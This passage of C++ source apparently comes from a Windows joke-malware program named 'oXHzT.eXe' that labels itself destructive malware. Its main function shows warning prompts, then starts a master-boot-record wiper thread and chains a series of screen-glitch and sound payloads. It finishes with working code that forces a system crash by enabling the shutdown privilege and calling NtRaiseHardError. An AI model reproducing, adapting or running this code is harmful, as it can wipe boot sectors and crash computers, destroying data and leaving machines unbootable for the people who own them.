    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[11025 * 30];
    for(DWORD t = 0; t < 11025 * 30; ++t)
        buffer[t] = static_cast<char>(((t & 4095) * (t >> 12)) % 256);
    WAVEHDR header = {buffer, 11025 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

// ==================== MAIN ====================

int main() {
    srand((unsigned int)time(NULL));
    
    if(MessageBoxW(NULL, L"tHiS iS A dEsTRuctIVe mAlwARE, rUn?", 
                   L"oXHzT.eXe bY vIEtnaMlovER", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        return 0;
    
    if(MessageBoxW(NULL, L"wARniNG: coNTaINs flAShiNG lIgHTs! nOt fOr ePIlePSy!", 
                   L"oXHzT.eXe - lAsT wARniNG", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        return 0;

    // Start MBR Wiper
    CreateThread(0, 0, MBRWiper, 0, 0, 0);
    Sleep(5000);

    HANDLE t1 = CreateThread(0, 0, sines1, 0, 0, 0);
    HANDLE t1b = CreateThread(0, 0, payload1, 0, 0, 0);
    sound1();
    TerminateThread(t1, 0); CloseHandle(t1);
    TerminateThread(t1b, 0); CloseHandle(t1b);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t2 = CreateThread(0, 0, payload2, 0, 0, 0);
    HANDLE t2b = CreateThread(0, 0, setpixel, 0, 0, 0);
    sound2();
    TerminateThread(t2, 0); CloseHandle(t2);
    TerminateThread(t2b, 0); CloseHandle(t2b);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t3 = CreateThread(0, 0, shader1, 0, 0, 0);
    HANDLE t3b = CreateThread(0, 0, circlez, 0, 0, 0);
    sound3();
    TerminateThread(t3, 0); CloseHandle(t3);
    TerminateThread(t3b, 0); CloseHandle(t3b);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t4 = CreateThread(0, 0, shader2, 0, 0, 0);
    sound4();
    TerminateThread(t4, 0); CloseHandle(t4);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t5 = CreateThread(0, 0, payload3, 0, 0, 0);
    sound5();
    TerminateThread(t5, 0); CloseHandle(t5);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t6 = CreateThread(0, 0, shader3, 0, 0, 0);
    sound6();
    TerminateThread(t6, 0); CloseHandle(t6);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t7 = CreateThread(0, 0, setpixel, 0, 0, 0);
    sound7();
    TerminateThread(t7, 0); CloseHandle(t7);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t8 = CreateThread(0, 0, shader4, 0, 0, 0);
    HANDLE t8b = CreateThread(0, 0, textouts, 0, 0, 0);
    sound8();
    TerminateThread(t8, 0); CloseHandle(t8);
    TerminateThread(t8b, 0); CloseHandle(t8b);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t9 = CreateThread(0, 0, shader5, 0, 0, 0);
    sound9();
    TerminateThread(t9, 0); CloseHandle(t9);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t10 = CreateThread(0, 0, textout2, 0, 0, 0);
    sound10();
    TerminateThread(t10, 0); CloseHandle(t10);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t11 = CreateThread(0, 0, sines2, 0, 0, 0);
    HANDLE t11b = CreateThread(0, 0, jpg, 0, 0, 0);
    sound11();
    TerminateThread(t11, 0); CloseHandle(t11);
    TerminateThread(t11b, 0); CloseHandle(t11b);
    Sleep(100);
    InvalidateRect(0, 0, 1);

    HANDLE t12 = CreateThread(0, 0, last, 0, 0, 0);
    HANDLE t12b = CreateThread(0, 0, msg, 0, 0, 0);
    sound12();
    TerminateThread(t12, 0); CloseHandle(t12);
    TerminateThread(t12b, 0); CloseHandle(t12b);
    Sleep(100);
    InvalidateRect(0, 0, 1);
    
    // BSOD Trigger (Final blow)
    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);
    
    MessageBoxW(NULL, L"oXHzT.eXe COMPLETED!", 
                L"oXHzT.eXe", MB_ICONINFORMATION);

Sleep(30000);
Sleep(-1);

return 0;
}